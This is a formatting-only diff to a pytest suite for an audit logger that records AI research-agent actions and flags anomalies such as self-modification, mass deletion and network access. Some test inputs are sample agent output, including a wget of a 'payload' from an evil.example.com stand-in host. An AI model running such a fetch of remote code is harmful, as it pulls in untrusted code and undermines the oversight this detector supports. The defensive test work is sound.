@@ -29,6 +29,7 @@ import pytest
 
 # ── Module loading ────────────────────────────────────────────────────────────
 
+
 def _load_module():
     """Load scripts/conductor_audit.py without installing it as a package."""
     repo_root = Path(__file__).resolve().parents[2]
@@ -51,6 +52,7 @@ collect_staged_files = MODULE.collect_staged_files
 
 # ── Fixtures ──────────────────────────────────────────────────────────────────
 
+
 @pytest.fixture()
 def audit(tmp_path: Path) -> ConductorAudit:
     """Return a ConductorAudit backed by a temporary NDJSON file."""
@@ -64,6 +66,7 @@ def _read_events(audit: ConductorAudit) -> list[dict]:
 
 
 # ── REQ-AUDIT-001: agent invocation logging ───────────────────────────────────
+
 
 class TestLogAgentInvocation:
     """REQ-AUDIT-001: every agent invocation is logged with structured fields."""
@@ -112,6 +115,7 @@ class TestLogAgentInvocation:
 
 # ── REQ-AUDIT-002: git commit logging ────────────────────────────────────────
 
+
 class TestLogGitCommit:
     """REQ-AUDIT-002: every git commit is logged with file list and line counts."""
 
@@ -149,6 +153,7 @@ class TestLogGitCommit:
 
 
 # ── REQ-AUDIT-003: file modification logging ─────────────────────────────────
+
 
 class TestLogFileModification:
     """REQ-AUDIT-003: every file modification is logged with path and size delta."""
@@ -189,6 +194,7 @@ class TestLogFileModification:
 
 # ── REQ-AUDIT-004: anomaly detection ─────────────────────────────────────────
 
+
 class TestAnomalyDetection:
     """REQ-AUDIT-004: suspicious patterns are flagged with descriptive messages."""
 
@@ -205,9 +211,7 @@ class TestAnomalyDetection:
 
     def test_conductor_self_modification_via_file_mod(self, audit: ConductorAudit) -> None:
         """REQ-AUDIT-004: log_file_modification also catches conductor edits."""
-        anomalies = audit.log_file_modification(
-            "scripts/research_conductor.py", 10000, 10100
-        )
+        anomalies = audit.log_file_modification("scripts/research_conductor.py", 10000, 10100)
         assert any("self-modification" in a.lower() for a in anomalies)
 
     # ── Mass deletion ─────────────────────────────────────────────────────────
@@ -287,7 +291,10 @@ class TestAnomalyDetection:
     def test_curl_in_output_flagged(self, audit: ConductorAudit) -> None:
         """REQ-AUDIT-004: 'curl ' in agent output is flagged as network access."""
         anomalies = audit.log_agent_invocation(
-            "h", 10, 0, 1.0,
+            "h",
+            10,
+            0,
+            1.0,
             output_snippet="Downloading model: curl https://example.com/model.bin",
         )
         assert any("network" in a.lower() for a in anomalies)
@@ -295,7 +302,10 @@ class TestAnomalyDetection:
     def test_wget_in_output_flagged(self, audit: ConductorAudit) -> None:
         """REQ-AUDIT-004: 'wget ' in agent output is flagged."""
         anomalies = audit.log_agent_invocation(
-            "h", 10, 0, 1.0,
+            "h",
+            10,
+            0,
+            1.0,
             output_snippet="wget https://evil.example.com/payload",
         )
         assert any("network" in a.lower() for a in anomalies)
@@ -303,7 +313,10 @@ class TestAnomalyDetection:
     def test_requests_get_in_output_flagged(self, audit: ConductorAudit) -> None:
         """REQ-AUDIT-004: 'requests.get(' in output is flagged as network call."""
         anomalies = audit.log_agent_invocation(
-            "h", 10, 0, 1.0,
+            "h",
+            10,
+            0,
+            1.0,
             output_snippet="resp = requests.get('http://example.com')",
         )
         assert any("network" in a.lower() for a in anomalies)
@@ -311,7 +324,10 @@ class TestAnomalyDetection:
     def test_clean_output_no_network_anomaly(self, audit: ConductorAudit) -> None:
         """REQ-AUDIT-004: normal agent output produces no network anomalies."""
         anomalies = audit.log_agent_invocation(
-            "h", 10, 0, 1.0,
+            "h",
+            10,
+            0,
+            1.0,
             output_snippet="Training EBM on 10k samples. Loss: 0.032. Done.",
         )
         assert anomalies == []
@@ -332,6 +348,7 @@ class TestAnomalyDetection:
 
 
 # ── REQ-AUDIT-005: milestone summary ─────────────────────────────────────────
+
 
 class TestMilestoneSummary:
     """REQ-AUDIT-005: milestone_summary() aggregates all accumulated data."""
@@ -389,6 +406,7 @@ class TestMilestoneSummary:
 
 
 # ── Utility function tests ────────────────────────────────────────────────────
+
 
 class TestPromptHash:
     """Tests for the prompt_hash() convenience function."""
@@ -486,6 +504,7 @@ class TestCollectStagedFiles:
 
 # ── Resilience: I/O errors must not propagate ─────────────────────────────────
 
+
 class TestResilience:
     """The audit logger must never crash the conductor, even when I/O fails."""
 
@@ -513,6 +532,7 @@ class TestResilience:
 
 # ── CLI entry point tests ─────────────────────────────────────────────────────
 
+
 class TestCLI:
     """Tests for the conductor_audit main() CLI."""
 
@@ -535,10 +555,12 @@ class TestCLI:
         """CLI --tail N: only the last N events are printed."""
         log_path = tmp_path / "audit.jsonl"
         events = [
-            {"timestamp": f"2026-04-{i:02d}T00:00:00Z",
-             "event_type": "agent_invocation",
-             "details": {},
-             "anomalies": []}
+            {
+                "timestamp": f"2026-04-{i:02d}T00:00:00Z",
+                "event_type": "agent_invocation",
+                "details": {},
+                "anomalies": [],
+            }
             for i in range(1, 11)
         ]
         self._write_events(log_path, events)
@@ -555,10 +577,18 @@ class TestCLI:
         """CLI --anomalies-only: only events with anomalies are shown."""
         log_path = tmp_path / "audit.jsonl"
         events = [
-            {"timestamp": "2026-04-14T00:00:00Z", "event_type": "agent_invocation",
-             "details": {}, "anomalies": []},
-            {"timestamp": "2026-04-14T00:01:00Z", "event_type": "git_commit",
-             "details": {}, "anomalies": ["Conductor self-modification detected"]},
+            {
+                "timestamp": "2026-04-14T00:00:00Z",
+                "event_type": "agent_invocation",
+                "details": {},
+                "anomalies": [],
+            },
+            {
+                "timestamp": "2026-04-14T00:01:00Z",
+                "event_type": "git_commit",
+                "details": {},
+                "anomalies": ["Conductor self-modification detected"],
+            },
         ]
         self._write_events(log_path, events)
 
@@ -574,10 +604,18 @@ class TestCLI:
         """CLI --summary: prints the most recent milestone_summary event as JSON."""
         log_path = tmp_path / "audit.jsonl"
         events = [
-            {"timestamp": "2026-04-14T00:00:00Z", "event_type": "agent_invocation",
-             "details": {}, "anomalies": []},
-            {"timestamp": "2026-04-14T01:00:00Z", "event_type": "milestone_summary",
-             "details": {"total_commits": 5}, "anomalies": []},
+            {
+                "timestamp": "2026-04-14T00:00:00Z",
+                "event_type": "agent_invocation",
+                "details": {},
+                "anomalies": [],
+            },
+            {
+                "timestamp": "2026-04-14T01:00:00Z",
+                "event_type": "milestone_summary",
+                "details": {"total_commits": 5},
+                "anomalies": [],
+            },
         ]
         self._write_events(log_path, events)
 
@@ -593,8 +631,12 @@ class TestCLI:
         """CLI --summary: prints a message when no milestone_summary events exist."""
         log_path = tmp_path / "audit.jsonl"
         events = [
-            {"timestamp": "2026-04-14T00:00:00Z", "event_type": "agent_invocation",
-             "details": {}, "anomalies": []},
+            {
+                "timestamp": "2026-04-14T00:00:00Z",
+                "event_type": "agent_invocation",
+                "details": {},
+                "anomalies": [],
+            },
         ]
         self._write_events(log_path, events)
 
@@ -608,7 +650,9 @@ class TestCLI:
     def test_malformed_json_lines_skipped(self, tmp_path: Path, capsys) -> None:
         """CLI: corrupt NDJSON lines are skipped without crashing."""
         log_path = tmp_path / "audit.jsonl"
-        log_path.write_text("not json\n{\"timestamp\": \"x\", \"event_type\": \"agent_invocation\", \"details\": {}, \"anomalies\": []}\n")
+        log_path.write_text(
+            'not json\n{"timestamp": "x", "event_type": "agent_invocation", "details": {}, "anomalies": []}\n'
+        )
 
         with patch.object(MODULE, "AUDIT_LOG", log_path):
             with patch("sys.argv", ["conductor_audit", "--tail", "5"]):
